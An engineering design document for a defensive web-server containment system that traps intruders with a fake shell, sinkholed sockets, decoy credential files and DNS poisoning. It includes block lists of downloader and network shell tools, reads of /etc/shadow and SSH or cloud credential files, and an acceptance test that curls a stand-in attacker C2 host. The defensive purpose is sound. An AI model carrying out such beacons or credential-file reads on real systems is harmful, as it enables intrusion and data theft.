# PROTECTED SERVICES — Trap Design

**Status:** Design, supersedes `docs/WEB_CONTAINMENT_ENGINEERING_SPEC_2026-05-20.md`
**Date:** 2026-05-20
**Scope:** nginx / apache / php-fpm first; pattern generalises to any pre-known service

---

## 1. Mission

> Make life hell for hackers. Even when they get in, trap them — unable to cause damage, unable to leave clean, unable to know they're trapped.

Three failure modes for an attacker who lands a code-exec primitive inside `nginx`:

| Outcome | What attacker experiences | What xhelix achieves |
|---|---|---|
| **A. Refused** | Operation visibly fails, attacker pivots | Cheap, deterministic, but attacker learns we exist |
| **B. Trapped** | Operation appears to succeed, then nothing useful happens | Attacker burns time on fake state, IOCs harvested, no real damage |
| **C. Contained** | Process suspended mid-attempt, can't resume | Forensic capture, lineage frozen, response engine takes over |

The previous engineering spec is heavy on **A** and **C**. This design adds **B** — the trap layer — as the default behavior wherever possible. Refusal is reserved for cases where mimicry would be unsafe (e.g. memory-corruption primitives).

---

## 2. Three-Ring Defense

```
                 ┌──────────────────────────────┐
                 │  Ring 1 — PREVENTION         │  cap drop, AppArmor, seccomp
                 │  refuse fast at kernel       │  bpf_override_return -EPERM
                 ├──────────────────────────────┤
                 │  Ring 2 — MISDIRECTION       │  fake shell, sinkhole socket,
                 │  succeed-fake, harvest IOCs  │  decoy FS, DNS poison, tarpit
                 ├──────────────────────────────┤
                 │  Ring 3 — CONTAINMENT        │  signals → pkg/takeover →
                 │  suspend, isolate, host-jail │  decision.ActionPlan
                 └──────────────────────────────┘
```

Ring 1 catches the cheap stuff at kernel speed.
Ring 2 is the A+ layer — where the *trap* happens.
Ring 3 is the existing canonical containment pipeline.

Every Ring-1 refusal AND every Ring-2 deception interaction emits a `takeover.Signal` into the per-lineage aggregator. The scorer composes them; the planner emits an `ActionPlan`. **There is no parallel decision system.**

---

## 3. Reconciliation with Canonical Types

The previous spec proposed a parallel `pkg/decision/actionplan` and `pkg/actionlog`. Those packages **already exist** (`pkg/decision.ActionPlan`, `pkg/actionlog.Log`, `pkg/takeover.Planner`) from the P-RF.2..P-RF.6 refactor. This design **maps the spec's concepts onto the existing types** instead of forking.

### Type mappings

| Spec concept | Canonical type | Notes |
|---|---|---|
| `Decision.Allow` | (no action) — Plan returns `NoOp` | Sub-threshold = allow |
| `Decision.Deny` | Ring 1: kernel-level refuse (seccomp/AppArmor) | Emits `SignalDefenseEvasion` |
| `Decision.Freeze` | `ActionPlan.SuspendProcess` | Layer 2 of containment cell |
| `Decision.Alert` | (always — every signal goes to actionlog) | Not a separate decision |
| Spec's `ActionPlan.ServiceName` | `ActionPlan.Reasons[]` carries `service=nginx-main` | Already free-form |
| `ActionPlan.FreezeProcess` | `ActionPlan.SuspendProcess` | Rename only |
| `ActionPlan.DenyExec/DenyConnect` | Kernel-side refusal, not an ActionPlan field | These run BEFORE planning |
| `ActionPlan.Snapshot/Memscan` | `ActionPlan.Snapshot/Memscan` | Already exist |
| `ProtectedEventKind` | `takeover.SignalKind` | See §6 — new SignalKinds added |

### New `ActionPlan` fields (additive, omitempty-safe)

The canonical `ActionPlan` gains three trap-layer bits. Backward compatible — old plans serialize identically.

```go
// Added to pkg/decision.ActionPlan:
FakeExec   bool   `json:"fake_exec,omitempty"`   // route forbidden exec to honey-shell
Sinkhole   bool   `json:"sinkhole,omitempty"`    // redirect socket to sinkhole listener
DecoyFS    bool   `json:"decoy_fs,omitempty"`    // overlay decoy view on sensitive paths
PoisonDNS  bool   `json:"poison_dns,omitempty"`  // resolve attacker-known C2 to sinkhole
```

Default for protected services: **all four on**. Operator can disable per-service if they need pure-refuse semantics for compliance reasons.

---

## 4. The Deception Layer (Ring 2 — the A+ part)

This is what makes attackers suffer. Each technique below makes a forbidden action **appear to succeed** while harvesting IOCs and feeding signals to the scorer.

### 4.1 Fake Shell

**Trigger:** nginx attempts `execve("/bin/sh", ...)` or `/bin/bash`, `/usr/bin/python3`, `/usr/bin/perl`, ...

**Default in current spec:** seccomp returns `-EPERM`, attacker sees "permission denied", pivots.

**A+ trap:**
- bpf_override_return on the security_bprm_check LSM hook
- exec succeeds — but the resolved binary is `/usr/lib/xhelix/honey-sh` (a static busybox shell with stdin/stdout/stderr redirected through xhelix)
- honey-sh prints a realistic shell prompt, accepts commands, returns plausible-but-fake output for `id`, `uname -a`, `whoami`, `ls`, `cat /etc/passwd`
- Every input keystroke + every fake response is logged into the evidence chain as `forensic.AttackerSession{}`
- Latency injection: 200-800ms per command (matches a slow remote shell — attacker thinks it's just lag)
- `cat /etc/shadow` returns the **decoy shadow** (see §4.3)
- `wget`/`curl` to attacker C2 routes through **sinkhole** (see §4.2)
- After 90s of attacker activity OR first attempted privilege escalation, score crosses 75 → SuspendProcess fires; attacker's "shell" hangs forever

**Why this is A+:** Attacker wastes minutes-to-hours believing they have RCE, while xhelix captures their entire toolkit + TTPs + C2 endpoints. Compare to refuse: attacker pivots in 5 seconds.

**Implementation:** `sensors/ebpf/progs/exec_redirect.bpf.c` + `pkg/deception/honeysh/`

### 4.2 Sinkhole Socket

**Trigger:** nginx attempts `connect()` to a destination outside `upstream_cidrs` allowlist (or DNS-resolved to a C2-flagged domain).

**Default in current spec:** seccomp/eBPF returns `-ECONNREFUSED`, attacker pivots.

**A+ trap:**
- bpf_override_return on `security_socket_connect`
- connect() succeeds — but the socket is rebound (via SO_ATTACH_BPF + tc redirect) to `127.0.0.1:<sinkhole-port>`
- Sinkhole listener speaks plausible HTTP/1.1 + TLS (self-signed but matches expected SNI)
- For HTTP: returns `200 OK` with a 4KB Lorem-ipsum body, slight realistic delay, sets cookies that match real APIs
- For raw TCP: echoes back a few bytes with randomized 50-500ms delay (attacker C2 framing parses successfully but never gets real data)
- Every byte sent by attacker → `forensic.C2Beacon{}` event with payload + extracted hostname + extracted JA3/JA4 fingerprint
- After 3 beacons → score crosses 75 → SuspendProcess

**Why this is A+:** Attacker's beacon successfully "phones home" — to us. We learn their C2 protocol, their tasking format, their encryption. Their actual C2 sees zero callbacks.

**Implementation:** `pkg/deception/sinkhole/` + `sensors/ebpf/progs/sock_redirect.bpf.c`

### 4.3 Decoy Filesystem

**Trigger:** nginx (or anything in nginx's cgroup) attempts to `openat(/etc/shadow, O_RDONLY)`, `/etc/sudoers`, `/root/.ssh/`, `/home/*/.aws/credentials`, browser password stores, etc.

**Default in current spec:** AppArmor denies, attacker sees EACCES.

**A+ trap:**
- LSM hook (or overlayfs binding) returns an fd for a **decoy** file:
  - `/etc/shadow` → realistic shadow with `$y$j9T$<honey-hashes>` that look crackable but are random
  - `/etc/sudoers` → mentions a honey-account "deploy" with NOPASSWD ALL
  - `~/.ssh/id_rsa` → looks like a 4096-bit RSA key, actually a watermarked decoy
  - `~/.aws/credentials` → has access_key+secret_key registered with us as canary credentials; **any use of these keys against AWS triggers Tier-1 SignalCanaryTouch**
- Decoys are pre-generated per host at install time; same decoy returned on every read (consistent across attacker re-reads)
- Each read of a decoy → `SignalCredAccess` with `Confidence: "deterministic"` + `Detail: "decoy /etc/shadow"`

**Why this is A+:** Attacker exfiltrates "credentials" → uses them → those uses fire alerts in our cloud telemetry → we know who's using them, from where, and we can poison their entire post-exfil workflow.

**Implementation:** `pkg/deception/decoyfs/` + AWS/GCP canary token integration (out of scope for v1 — generate decoys but skip cloud registration)

### 4.4 DNS Poison

**Trigger:** nginx-cgroup process resolves a domain in the known-bad list (loaded from threat intel) OR a domain that looks like a DGA pattern (entropy > threshold).

**Default in current spec:** allow, alert.

**A+ trap:**
- xhelix-local DNS shim binds the UDP/TCP 53 syscall path
- Resolution for flagged domains returns sinkhole IP (`127.66.66.<low-byte-of-domain-hash>`)
- All connections to that IP land in the sinkhole listener (§4.2)
- `SignalC2Beacon` with confidence `deterministic` (known-bad domain → unambiguous attribution)

**Why this is A+:** C2 callback never reaches the actual C2 server. Attacker's tooling reports success internally; we get the malware traffic.

**Implementation:** `pkg/deception/dnspoison/` (reuses existing netban CIDR plumbing)

### 4.5 Tarpit (Attributed IP-Level)

**Trigger:** ActionPlan emitted with `Tarpit: true` (per existing CONTAINMENT_DESIGN.md §2).

**Mechanism:** nftables + tc qdisc limit to **8 bit/s ingress/egress** for the attributed IP. Existing connections stay alive (so attacker doesn't notice the abrupt drop) — they just become unbearably slow.

**Why this is A+:** Attacker thinks the target is just having a bad day. Real defenders see this and pivot to forensics; criminals waste hours retrying. (Already designed in CONTAINMENT_DESIGN.md, reaffirmed here.)

### 4.6 Cost-Asymmetry Budget

Every deception interaction costs xhelix microseconds and costs attacker **seconds-to-minutes** of real time. Concrete budget:

| Interaction | Attacker time burned | xhelix cost |
|---|---|---|
| Fake shell command + response | 400ms latency × N commands | < 1ms / command |
| Sinkhole TCP response | 50-500ms delay × N beacons | < 1ms / beacon |
| Decoy file read | 0 (instant) | 0 (cached) |
| DNS poison resolve | 0 (instant) | < 1ms |
| Tarpit at 8 bit/s | Hours per MB | 0 (kernel qdisc) |
| Detection-to-suspend gate | 90s typical | 0 (already running) |

Target: **attacker burns 100× the real-time we spend** on every interaction. Verified per-deception in load tests.

---

## 5. Ring 1 — Prevention (the deterministic part)

Where mimicry would be unsafe or wasteful, Ring 1 refuses cleanly. These are the cases:

### 5.1 Memory-corruption primitives (always refuse)

Anonymous RWX mmap, `mprotect(... PROT_EXEC | PROT_WRITE)`, `memfd_create` + execve on the memfd, JIT pages without proper W^X transitions. These signal active exploit-in-progress.

- seccomp blocks the syscall classes
- Detection-only via eBPF if seccomp can't catch the specific pattern (e.g. mprotect transition)
- Emits `SignalDefenseEvasion` weight 90 + immediate `SuspendProcess` regardless of score

**Why no trap:** by the time we see RWX, attacker is mid-exploit. Mimicry could mask actual RCE. Refuse hard.

### 5.2 Namespace-escape primitives (always refuse)

`unshare`, `setns`, `mount`, `umount2`, `pivot_root`, `chroot` from a non-init namespace.

- seccomp denial
- Emits `SignalDefenseEvasion`

### 5.3 EDR-tamper primitives (always refuse)

`ptrace` against xhelix or any audit-relevant process, `bpf()` from non-allowlisted lineages, `perf_event_open`, attempts to write `/sys/kernel/security/lsm`, attempts to unload kernel modules.

- LSM denial via BPF LSM
- Emits `SignalDefenseEvasion` weight 90 → Suspend immediately
- (And: xhelix daemon self-protection via existing `pkg/tamperguard`)

### 5.4 Hard-coded never-learnable invariants

These are NEVER added to learned allowlists, regardless of how many times they appear during learn mode:

| Class | Examples |
|---|---|
| Shell exec | `/bin/sh`, `/bin/bash`, `/bin/dash`, `/bin/ash`, `/bin/zsh` |
| Interpreter exec | `/usr/bin/python*`, `/usr/bin/perl`, `/usr/bin/ruby`, `/usr/bin/node`, `/usr/bin/php` (when from nginx-cgroup directly, not via php-fpm IPC) |
| Downloader exec | `curl`, `wget`, `fetch`, `aria2c`, `axel` |
| Recon exec | `nmap`, `nc/ncat`, `socat`, `tcpdump` |
| Privilege exec | `su`, `sudo`, `pkexec`, `doas` |
| Writes | Anywhere outside declared `write_roots` |
| Memory | Any RWX transition; any memfd-exec |
| Syscalls | ptrace, unshare, setns, mount, umount2, bpf, perf_event_open, userfaultfd, kexec_load |

Defaults to **fake-exec for the first four** (Ring 2), **refuse for the last three** (Ring 1).

---

## 6. Signal Integration (everything feeds the scorer)

Every Ring-1 refusal and every Ring-2 deception interaction emits a `takeover.Signal`. The per-lineage aggregator composes them; the planner emits one `ActionPlan` per lineage, not per event.

### New SignalKinds (added to `pkg/takeover.signal.go`)

```go
SignalShellAttempt   SignalKind = "shell_attempt"    // tried to exec a shell — Tier-1, weight 80
SignalInterpAttempt  SignalKind = "interp_attempt"   // tried to exec interpreter — Tier-1, weight 70
SignalDownloader     SignalKind = "downloader"       // tried to exec curl/wget — Tier-1, weight 75
SignalC2Beacon       SignalKind = "c2_beacon"        // sinkholed outbound — Tier-1, weight 85
SignalDecoyTouch     SignalKind = "decoy_touch"      // read a decoy file — Tier-1, weight 85
SignalForbiddenSyscall SignalKind = "forbidden_syscall" // seccomp denial — Tier-2, weight 50
SignalForbiddenWrite SignalKind = "forbidden_write"  // write outside roots — Tier-1, weight 80
SignalRWXMemory      SignalKind = "rwx_memory"       // anon RWX or W→X transition — Tier-1, weight 95
SignalCrashLoop      SignalKind = "crash_loop"       // service segfaulted 3x — Tier-1, weight 80
```

**Composition rule (from BEHAVIORAL_DEFENSE.md §5):** A single Tier-1 signal crosses 75 (Suspended). Two Tier-2 stack to cross. Tier-3 requires multiple. **Honey signals are always Tier-1** — no ambiguity about who touched a decoy.

### Crash-Loop Trap (cheap, high-signal)

Track per-service segfault count over a 60-second sliding window. If ≥ 3 → assume in-progress exploit → emit `SignalCrashLoop` → ActionPlan goes straight to SuspendProcess on the whole lineage tree → never auto-restart. systemd's RestartSec is irrelevant; xhelix holds the process tree frozen until operator releases.

---

## 7. Forensic Harvest Pipeline

Every deception interaction must be losslessly captured. Attackers learn from blind retry but cannot learn from never-completing operations.

### 7.1 Per-interaction evidence

Each deception interaction emits a `forensic.Event` with:
- timestamp (ns precision)
- service identity (name, cgroup, pid, lineage_id)
- interaction type (shell command, beacon bytes, file read, DNS query)
- attacker payload (raw bytes, capped at 64 KB; full content if larger goes to cold store)
- our response (what we returned)
- elapsed time

### 7.2 Chain integration

These events are batched, signed (ed25519, existing `pkg/chain`), and hash-chained alongside normal evidence. `xhelix-verify` walks the chain offline and includes deception events in tamper detection.

### 7.3 IOC extraction

A background processor (`pkg/deception/iocextract/`) walks attacker payloads and extracts:
- Domains, IPs, URLs
- File paths the attacker referenced
- Commands the attacker tried (n-gram analysis)
- TLS JA3/JA4 fingerprints
- HTTP user-agents
- Base64 / hex / encoded payloads

These flow into an IOC store consumable by other hosts in the fleet via the existing baseline hub plumbing. **One trapped attacker hardens every other host.**

---

## 8. Service Identity (carry-over from spec, refined)

`pkg/profiles/serviceid` — maps (pid, cgroup, unit, exe SHA, uid) → `ProtectedService`. Identical to spec §4. The matcher caches `cgroup_id → service_name` because cgroup_id is stable for the service lifetime (much cheaper than per-event /proc inspection).

### Verification

On every match, verify:
- `exe SHA-256` matches expected (catches binary replacement attacks)
- `unit` matches expected (catches systemd-unit hijacks)
- `uid` matches expected (catches uid 0 escapes)

A mismatch is itself a Tier-1 signal: `SignalDefenseEvasion` weight 90, force Suspend.

---

## 9. Built-in Contracts (carry-over from spec, two clarifications)

`pkg/profiles/contracts/builtin_nginx.go` + `builtin_apache.go` ship default contracts per role. Two refinements:

1. **Contracts ship deception defaults too** — every contract declares which deception layers apply: `fake_exec: true`, `sinkhole: true`, `decoy_fs: true`, `poison_dns: true`. Operator can opt out per-service for compliance environments where mimicry is forbidden, but the default is full trap-mode.

2. **PHP module is a special case** — `apache/php_module` runs PHP **inside** the apache process. Exec from that process IS expected behavior for some apps (image processing, etc.). Solution: contract declares `php_module_exec_allowlist: [/usr/bin/convert, /usr/bin/gs, ...]`; anything else still triggers fake-exec. **No silent allowance of shell.**

---

## 10. Learning Mode (security-hardened)

Spec §15 Milestone 7 had a 168-hour learn window. That's too long and too trusting. Refined design:

### 10.1 Two-tier learning

1. **Tier-1 learn (24h, automatic)**: collect upstream IPs, UNIX sockets, write subpaths, worker envelope. Locked at 24h boundary.
2. **Tier-2 learn (manual)**: operator explicitly enables; expands allowlists from observed behavior. Requires operator WebAuthn step-up + comment + crypto-signed approval.

### 10.2 Poisoning resistance

Learn mode **never** records:
- Any of the never-learnable invariants from §5.4
- Any signal emitted during periods when actionlog has any non-Observed state on any lineage of that service
- Any signal where the source process exe SHA mismatches the expected binary

If actionlog had even one Suspended state during the learn window → operator is warned that learning is potentially poisoned → restart-from-clean is recommended.

### 10.3 Cryptographic profile lock

Locked profile = JSON manifest + ed25519 signature using the host's xhelix key. Profile changes require operator WebAuthn step-up. Manifest changes are themselves evidence events (chained).

---

## 11. CapabilitySet Additions

`pkg/runtime.CapabilitySet` gains six new readiness markers (`Mark*Ready()`). The planner checks these before emitting deception-action plans; missing capabilities → CapabilityWarnings (no silent degradation).

```go
FakeExecReady   bool // honey-sh installed, bpf_override_return verified working
SinkholeReady   bool // sinkhole listener bound, redirect program loaded
DecoyFSReady    bool // decoy files generated, LSM hook installed
PoisonDNSReady  bool // local DNS shim listening
ProtectedSvcRegistry bool // pkg/protectedsvc loaded and validated
SeccompReady    bool // service-specific seccomp profile compiled
```

---

## 12. Build Sequence (integrated with refactor)

This design lands **after** P-RF.7 (run.go decomposition) and **after** P-RF.9 (executor extraction). Sequencing the prevention/deception work before the refactor would require rewriting all of it once dispatch moves out of run.go.

| Phase | Days | Deliverable |
|---|---|---|
| **P-PS.0** | 0 (this doc) | Reconciled design, supersedes spec |
| **P-PS.1** | 3 | `pkg/protectedsvc` types + `pkg/profiles/serviceid` matcher |
| **P-PS.2** | 4 | `pkg/profiles/contracts` + built-in nginx/apache contracts |
| **P-PS.3** | 5 | Seccomp generator (`pkg/prevent/seccomp`) — Ring 1 syscall denial |
| **P-PS.4** | 5 | AppArmor profile generator (`pkg/prevent/apparmor`) — Ring 1 fs/exec denial. **Skip SELinux for v1** — pick one MAC. |
| **P-PS.5** | 4 | Signal wiring — every Ring-1 refusal emits a `takeover.Signal` |
| **P-PS.6** | 7 | **Ring 2 — Honey shell** (`pkg/deception/honeysh` + eBPF redirect) |
| **P-PS.7** | 7 | **Ring 2 — Sinkhole socket** (`pkg/deception/sinkhole` + tc redirect) |
| **P-PS.8** | 5 | **Ring 2 — Decoy FS** (`pkg/deception/decoyfs` + LSM overlay) |
| **P-PS.9** | 3 | **Ring 2 — DNS poison** (`pkg/deception/dnspoison`) |
| **P-PS.10** | 4 | Crash-loop trap (`sensors/crashloop`) |
| **P-PS.11** | 4 | Forensic harvest + IOC extraction (`pkg/deception/iocextract`) |
| **P-PS.12** | 6 | Two-tier learning + crypto-signed profile lock |
| **P-PS.13** | 5 | Operator UX (protected services list, contract view, residual-risk view, deception coverage report) |
| **P-PS.14** | 3 | Acceptance tests (§13) |

**Total:** ~65 days end-to-end. Skip P-PS.6/7/8/9 for a refuse-only MVP (~35 days), but the value of the system drops from A+ to B.

---

## 13. Acceptance Criteria (binary, no wiggle room)

The system is acceptance-ready when an external red team running a standard nginx-PHP exploit chain experiences ALL of the following on a default-config xhelix host:

### Ring 1 — refusal works

- [ ] `execve("/bin/sh")` from nginx returns `EPERM` (in refuse-only mode) OR routes to honey-sh (in trap mode)
- [ ] `mprotect(...PROT_EXEC|PROT_WRITE...)` from nginx returns `EPERM`
- [ ] `ptrace(PTRACE_ATTACH, xhelix_pid, ...)` returns `EPERM`
- [ ] Write to `/etc/cron.d/anything` from nginx returns `EACCES`
- [ ] Connect to a non-allowlisted CIDR returns `ECONNREFUSED` (refuse mode) OR routes to sinkhole (trap mode)

### Ring 2 — trap works

- [ ] Honey-sh appears responsive for 60+ seconds; attacker can run `id`, `uname`, `ls`, `cat /etc/passwd`, get plausible output
- [ ] `cat /etc/shadow` from honey-sh returns the decoy shadow (not the real one, not `EACCES`)
- [ ] `curl http://attacker-c2.example.com/beacon` returns `200 OK` with sinkhole content; attacker's C2 server sees zero callbacks
- [ ] Every honey-sh command + every sinkhole byte + every decoy read appears in the evidence chain
- [ ] After 90s of attacker activity, `actionlog` shows `Suspended` for the nginx lineage

### Ring 3 — containment works

- [ ] `pkg/takeover` score crosses 75 within 90s of first attacker activity
- [ ] `decision.Plan()` emits an `ActionPlan` with `SuspendProcess: true`
- [ ] nginx workers SIGSTOP'd, no new sessions can be served to attacker's IP
- [ ] If `BastionAvailable && OffHostMirrorAvailable`, score 100 → `IsolateHost`
- [ ] `xhelix-verify` validates the entire deception evidence chain

### Cost-asymmetry holds

- [ ] xhelix CPU overhead < 5% during sustained deception traffic
- [ ] Attacker per-command latency in honey-sh: 200ms p50, 800ms p99
- [ ] Sinkhole socket per-beacon latency: 50ms p50, 500ms p99
- [ ] 1 GB attacker exfil attempt under tarpit (8 bit/s): completion estimate > 30 days

### Compliance escape hatches

- [ ] Operator can disable Ring 2 per-service with single config flag
- [ ] All Ring-1 refusals can be configured to operator-visible `EACCES`/`EPERM` for environments where mimicry is legally restricted (e.g. lawful-intercept jurisdictions where lying to a process may be prohibited)
- [ ] Deception evidence retention is configurable separately from normal evidence (legal hold)

---

## 14. Residual Risk

Even with everything above, an attacker CAN still:

1. **Read files already readable by the service.** If nginx legitimately reads `/var/www/secrets.env`, an attacker inside nginx reads it too. Mitigation: the residual-risk report enumerates every readable sensitive path per service so operators see this surface and can move secrets to brokered access (`pkg/secrets`).

2. **Send arbitrary traffic to allowlisted upstreams.** If `upstream_cidrs` includes the database, an attacker reaches the database. Mitigation: layer DLCF (P7) — Data Passport on egress + per-row taint — and Request Contracts (P-RC) bind the upstream call to a specific verified request.

3. **Act inside process memory before hitting a forbidden primitive.** An exploit that reads memory and crafts an HTTP response (no exec, no syscall, no write) can leak secrets through normal output. Mitigation: in-process behavior is the WAF / runtime application self-protection (RASP) problem — explicit non-goal per spec §2.

4. **Trigger the trap from a third-party who shouldn't be touched** (compliance risk). Mitigation: §13 compliance escape hatch lets ops opt out per-service.

The **residual-risk view** in the operator UX surfaces 1, 2, 3 per-service so the risk is explicit and quantified, not hidden.

---

## 15. What This Design Does NOT Do

Honest non-promises:

- **Does not stop in-memory exploitation pre-trigger.** If attacker has RCE in nginx and just calls `read()` on already-open fds and writes through `write()`, no forbidden primitive fires. This design assumes attacker eventually does *something* forbidden (and they always do, eventually).
- **Does not replace patching.** Sandbox + deception means a compromised nginx is contained, but nginx is still compromised. Patch.
- **Does not detect business-logic abuse.** If the attacker uses the application correctly to abuse business logic (canonical CVE-less authz bypass), nothing in protected services helps. That's BEHAVIORAL_DEFENSE.md territory.
- **Does not make life hell for an attacker who never tries anything forbidden.** A patient attacker who just exfiltrates already-readable data through the normal HTTP response stream gets a free pass at Ring 1+2. They show up in DLCF (P7) instead.

---

## 16. Comparison Table — This Design vs. Prior Spec

| Dimension | Prior spec | This design |
|---|---|---|
| Type system | Parallel `ActionPlan` | Reuses canonical `decision.ActionPlan` (additive fields) |
| Decision pipeline | Per-event allow/deny/freeze | Per-lineage signal aggregation → planner |
| Attacker experience | Refusal + alert | Refusal OR trap (configurable; trap default) |
| IOC harvest | None | Per-deception harvest + fleet-wide IOC store |
| Cost asymmetry | None measured | 100× attacker:defender real-time ratio target |
| Learning safety | 168h auto-lock | 24h auto-lock + Tier-2 manual + signed manifest |
| MAC | AppArmor + SELinux + seccomp | AppArmor + seccomp (skip SELinux for v1) |
| Crash-loop | Mentioned as optional | First-class Tier-1 signal |
| MITRE alignment | Implicit | Explicit (every SignalKind tagged with MITRE phase) |
| Build sequence | 8 milestones, no integration plan | 15 phases, sequenced behind refactor |

---

## 17. One-Page Operator Summary

For ops who don't read 600-line specs:

> **Protected Services** is xhelix's web-server containment layer.
>
> Default behavior for protected nginx/apache:
>
> 1. Service can only do what its contract allows (write to its own logs, connect to its own upstreams, run its own binary).
> 2. If the service tries to do anything forbidden — spawn a shell, connect to the internet, read /etc/shadow, write to /etc/cron.d — xhelix makes it APPEAR to succeed, then watches the attacker waste time.
> 3. Everything the attacker tries is recorded — keystrokes, commands, C2 protocol, file accesses, network beacons.
> 4. After ~90 seconds of suspicious activity, the service process is frozen mid-exploit. Attacker's "shell" hangs forever; the real service is restarted clean.
> 5. The attacker's IP is tarpitted to 8 bit/s — connections stay open but transfer nothing useful.
> 6. The evidence chain has the full forensic record.
>
> If your compliance regime forbids deceiving processes (rare), set `protected_services.deception.enabled: false` and you get plain refuse-mode.

---

**End of design.** This is the A+ build. The previous spec was the B+ build. Implementing this requires the refactor (P-RF.7..P-RF.9) to complete first, then ~65 days for full coverage or ~35 for refuse-only MVP.
